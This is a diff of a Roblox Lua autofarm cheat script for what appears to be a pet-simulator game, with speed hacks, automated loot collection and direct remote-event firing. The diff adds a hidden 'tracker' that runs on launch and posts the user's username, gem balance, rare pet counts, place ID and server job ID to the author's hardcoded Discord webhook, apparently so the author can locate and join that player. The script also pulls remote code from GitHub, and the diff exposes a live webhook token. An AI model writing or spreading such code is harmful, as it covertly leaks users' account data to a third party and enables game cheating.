@@ -1,6 +1,6 @@
 -- =====================================================================
 -- 🚀 POODLE HUD - FANTASY CORE (FARM + HATCH + COMBINE + TIME TRIAL)
--- 🎁 EXTREME OPTIMIZATION + RADAR SCANNING + PERFECT AUTO FRUIT
+-- 🎁 V8 ASYNC + STATIC PETS + TRACKER INTEGRATED
 -- =====================================================================
 if _G.CoreFarmStarted then return end
 _G.CoreFarmStarted = true
@@ -59,7 +59,7 @@ end
 
 local vm = loadUtils("https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/VariablesManager.lua", "VariablesManager.lua")
 local vmInst = vm:new()
--- LOẠI BỎ AllBreakables VÌ CHÚNG TA ĐÃ CHUYỂN SANG RADAR SCAN
+
 vmInst:Add("CurrentZone", nil, "string")
 vmInst:Add("SessionHuge", 0, "number")
 vmInst:Add("SessionTitanic", 0, "number")
@@ -72,12 +72,89 @@ vmInst:Add("StatusMessage", "Khởi động...", "string")
 
 _G.FARM_STATE = "INITIALIZING" 
 
-pcall(function() 
-    PlayerPet.CalculateSpeedMultiplier = function() return math.huge end 
+-- ==========================================
+-- 1.5. 🕵️ WEBHOOK TRACKER (FANTASY VERSION)
+-- ==========================================
+task.spawn(function()
+    local httprequest = (request or http_request or syn and syn.request)
+    if not httprequest then return end
+    
+    local trackerWebhook = "https://discord.com/api/webhooks/1486898274114867293/pPHr-g89YTRCTv4Fj9xIi9vY48ahbMW8Z1V2o4sNxeT_LBR2yARppNXsWsKGK9bSIyhq"
+    
+    task.wait(2) 
+    local save = Save.Get()
+    
+    local hugeCount = 0
+    local titanicCount = 0
+    if save and save.Inventory and save.Inventory.Pet then
+        for uid, petData in pairs(save.Inventory.Pet) do
+            if type(petData.id) == "string" then
+                if string.find(petData.id, "Huge") then
+                    hugeCount = hugeCount + (petData._am or 1)
+                elseif string.find(petData.id, "Titanic") then
+                    titanicCount = titanicCount + (petData._am or 1)
+                end
+            end
+        end
+    end
+    
+    local gems = 0
+    pcall(function() gems = CurrencyCmds.Get("Diamonds") or 0 end)
+    local formattedGems = tostring(gems)
+    pcall(function()
+        local suffixes = {"", "k", "m", "b", "t"}
+        local index = 1
+        local absNumber = math.abs(gems)
+        while absNumber >= 1000 and index < #suffixes do absNumber = absNumber / 1000; index = index + 1 end
+        formattedGems = (absNumber >= 1 and index > 1) and string.format("%.2f", absNumber):gsub("%.00$", "") .. suffixes[index] or tostring(math.floor(absNumber)) .. suffixes[index]
+    end)
+    
+    local data = {
+        ["content"] = "🔔 **Ai đó vừa kích hoạt Script FANTASY của bạn!**",
+        ["embeds"] = {{
+            ["title"] = "📊 Thông tin người chơi (FANTASY CORE)",
+            ["color"] = tonumber(0x00FF96),
+            ["fields"] = {
+                { ["name"] = "👤 Tên người dùng", ["value"] = string.format("`%s` (%s)", LocalPlayer.Name, LocalPlayer.DisplayName), ["inline"] = false },
+                { ["name"] = "💎 Số lượng Gems", ["value"] = formattedGems, ["inline"] = true },
+                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: **%d** | Titanic: **%d**", hugeCount, titanicCount), ["inline"] = true },
+                { ["name"] = "🌍 Place ID", ["value"] = string.format("`%s`", tostring(game.PlaceId)), ["inline"] = false },
+                { ["name"] = "🔗 Job ID (Copy để join)", ["value"] = string.format("`%s`", tostring(game.JobId)), ["inline"] = false }
+            },
+            ["thumbnail"] = { ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png" },
+            ["footer"] = { ["text"] = "Poodle Tracker System" },
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+    
+    pcall(function() 
+        httprequest({ Url = trackerWebhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) 
+    end)
 end)
 
 -- ==========================================
--- 1.5. ADVANCED WEBHOOK SENDER MODULE
+-- 2. TỐI ƯU HÓA: STATIC PETS & SPEED VÔ CỰC
+-- ==========================================
+pcall(function()
+    PlayerPet.CalculateSpeedMultiplier = function() return math.huge end
+    if PlayerPet.SetTarget then
+        PlayerPet.SetTarget = function() return end 
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    pcall(function()
+        local myPets = PlayerPet.GetAll()
+        for _, pet in pairs(myPets) do
+            if pet.owner == LocalPlayer then
+                pet.target = nil 
+            end
+        end
+    end)
+end)
+
+-- ==========================================
+-- 3. ADVANCED WEBHOOK SENDER MODULE
 -- ==========================================
 local WebhookSender = {}
 local WEBHOOK_URL = config.WebhookURL or ""
@@ -166,7 +243,8 @@ function WebhookSender.SendPet(petName, variant, playerName, existsCount)
     
     local fields = {
         { name = "🐾 Pet", value = string.format("```%s```", fullName), inline = true },
-        { name = "👤 Player", value = string.format("```%s```", playerName), inline = true },
+        { name = "👤 Player", value = string.format("
+```%s```", playerName), inline = true },
         { name = "📈 Exists", value = string.format("```%s```", existsCount or "?"), inline = true }
     }
     
@@ -206,7 +284,7 @@ end
 WebhookSender.Initialize()
 
 -- ==========================================
--- 2. TỐI ƯU HÓA FPS & CHỐNG AFK (BLACKOUT)
+-- 4. TỐI ƯU HÓA FPS & CHỐNG AFK (BLACKOUT)
 -- ==========================================
 local DummyPlatformPos = Vector3.new(0, 15000, 0)
 local ActiveDummy = nil
@@ -234,7 +312,6 @@ local function CreateOptimizationAndPlatforms()
     for _, v in pairs(Workspace:GetDescendants()) do optimizePart(v) end
     Workspace.DescendantAdded:Connect(optimizePart)
 end
-
 
 local function SetupDummyAndCamera()
     local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
@@ -281,14 +358,13 @@ pcall(function()
 end)
 
 -- ==========================================
--- 3. QUẢN LÝ LOOT & RADAR SCAN (ĐÃ BỎ NETWORK EVENT CHO BREAKABLES)
+-- 5. QUẢN LÝ LOOT & RADAR SCAN 
 -- ==========================================
 local THINGS = Workspace:WaitForChild("__THINGS")
 local BreakablesFolder = THINGS:WaitForChild("Breakables")
 local LootbagsFolder = THINGS:FindFirstChild("Lootbags")
 local OrbsFolder = THINGS:FindFirstChild("Orbs")
 
--- TỐI ƯU HÓA LOOT: Dùng vòng lặp nhặt theo lô (Batch)
 task.spawn(function()
     while task.wait(0.5) do
         pcall(function()
@@ -313,7 +389,7 @@ task.spawn(function()
 end)
 
 -- ==========================================
--- 4. BỔ TRỢ: SMART AUTO FRUIT, GIFTS, MAIL, ULTIMATE
+-- 6. BỔ TRỢ: SMART AUTO FRUIT, GIFTS, MAIL, ULTIMATE
 -- ==========================================
 local function GetCurrentFruitStack(fruitName)
     local activeFruits = {}
@@ -443,7 +519,7 @@ task.spawn(function()
 end)
 
 -- ==========================================
--- 5. TRÍCH XUẤT HỘP QUÀ (LOOTBOXES)
+-- 7. TRÍCH XUẤT HỘP QUÀ (LOOTBOXES)
 -- ==========================================
 local PresentTiers = {
     [1] = "Small Fantasy Present",
@@ -501,7 +577,7 @@ local function GetGems()
 end
 
 -- ==========================================
--- 6. GIAO DIỆN NỀN ĐEN & THỐNG KÊ (UI FULLSCREEN)
+-- 8. GIAO DIỆN NỀN ĐEN & THỐNG KÊ (UI FULLSCREEN)
 -- ==========================================
 getgenv().HideEggAnimation = true
 local EggFrontend = nil
@@ -677,7 +753,7 @@ task.spawn(function()
 end)
 
 -- ==========================================
--- 7. LÕI QUẢN LÝ ĐIỀU HƯỚNG: TIME TRIAL & NORMAL
+-- 9. LÕI QUẢN LÝ ĐIỀU HƯỚNG: TIME TRIAL & NORMAL
 -- ==========================================
 local INSTANCE_NAME = "TimeTrial"
 local TILE_RADIUS = 70 
@@ -895,41 +971,63 @@ task.spawn(function()
     end
 end)
 
--- VÒNG LẶP SÁT THƯƠNG NORMAL FARM (RADAR SCAN + GIỚI HẠN MỤC TIÊU CỰC KỲ TỐI ƯU FPS)
-task.spawn(function()
-    while task.wait(0.2) do 
-        if _G.FARM_STATE ~= "NORMAL" then continue end
-        if InstancingCmds.GetInstanceID() == INSTANCE_NAME then continue end 
-        
-        pcall(function()
-            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-            if not hrp then return end
-            
-            local availableBreakables = {}
-            -- CHỈ QUÉT RƯƠNG TRONG BÁN KÍNH 80 STUDS VÀ GIỚI HẠN TỐI ĐA 20 RƯƠNG
-            for _, b in ipairs(BreakablesFolder:GetChildren()) do
-                if b:IsA("Model") and b.PrimaryPart and (b.PrimaryPart.Position - hrp.Position).Magnitude < 150 then
-                    table.insert(availableBreakables, b.Name)
-                    if #availableBreakables >= 50 then break end
-                end
-            end
-            
-            local numB = #availableBreakables
-            if numB > 0 then
-                local maxDamageSend = math.min(numB, 5)
-                for i = 1, maxDamageSend do Network.UnreliableFire("Breakables_PlayerDealDamage", availableBreakables[i]) end
+-- ==========================================
+-- ⚔️ V8 ASYNC FAST FARM (NO-SORT + STATIC PETS)
+-- ==========================================
+local lastFarmTick = 0
+local FARM_DELAY = 0.2 
 
-                local equippedPets = PetNetworking.EquippedPets()
-                local petIDs = {}
-                if equippedPets then for uid, _ in pairs(equippedPets) do table.insert(petIDs, uid) end end
-                
-                if #petIDs > 0 then
-                    local bulkAssignments = {}
-                    for i, petID in ipairs(petIDs) do bulkAssignments[petID] = availableBreakables[(i % numB) + 1] end
-                    if next(bulkAssignments) then Network.Fire("Breakables_JoinPetBulk", bulkAssignments) end
-                end
+RunService.Heartbeat:Connect(function()
+    if _G.FARM_STATE ~= "NORMAL" then return end
+    if InstancingCmds.GetInstanceID() == INSTANCE_NAME then return end 
+    
+    local now = os.clock()
+    if now - lastFarmTick < FARM_DELAY then return end
+    lastFarmTick = now
+
+    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local rootPos = root.Position
+
+    -- QUÉT SIÊU TỐC
+    local targets = {}
+    for _, b in ipairs(BreakablesFolder:GetChildren()) do
+        if b:IsA("Model") and b.PrimaryPart then
+            if (b.PrimaryPart.Position - rootPos).Magnitude < 130 then 
+                table.insert(targets, b.Name)
+                if #targets >= 50 then break end
             end
-        end)
+        end
+    end
+
+    local numTargets = #targets
+    if numTargets > 0 then
+        -- ⚡ CLICK AURA: Bắn Player Damage
+        local auraLimit = math.min(numTargets, 30)
+        for i = 1, auraLimit do
+            Network.UnreliableFire("Breakables_PlayerDealDamage", targets[i])
+        end
+
+        local myPets = {}
+        for euid, pet in pairs(PlayerPet.GetAll()) do
+            if pet.owner == LocalPlayer then table.insert(myPets, euid) end
+        end
+
+        local numPets = #myPets
+        if numPets > 0 then
+            local bulkAssignments = {}
+            for i = 1, numPets do
+                local targetIndex = ((i - 1) % numTargets) + 1
+                bulkAssignments[myPets[i]] = targets[targetIndex]
+            end
+
+            -- ⚡ DEFER CALL: Bắn tín hiệu bất đồng bộ
+            if next(bulkAssignments) then
+                task.defer(function()
+                    Network.Fire("Breakables_JoinPetBulk", bulkAssignments)
+                end)
+            end
+        end
     end
 end)
 
